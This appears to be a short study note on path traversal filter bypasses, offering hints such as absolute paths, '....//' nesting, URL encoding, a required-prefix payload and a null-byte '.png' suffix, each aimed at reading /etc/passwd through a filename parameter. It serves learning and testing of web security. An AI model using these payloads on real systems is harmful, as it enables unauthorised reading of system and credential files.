
> [!hint] 
> Sometimes symbols `..` are blocked so we can just use:
> - `Absolute paths`
> - `....//` (equal to one `..`) 
> - `Encoding` (like URL or double URL or anything else)

> [!hint] 
> Sometimes **start way to folder is necessary**, so we should provide path like this:
> `filename=/var/www/images/../../../etc/passwd`

> [!hint] 
> Sometimes **filename must be in correct format** like `.png`, so we can do this instead:
> `filename=../../../etc/passwd%00.png`
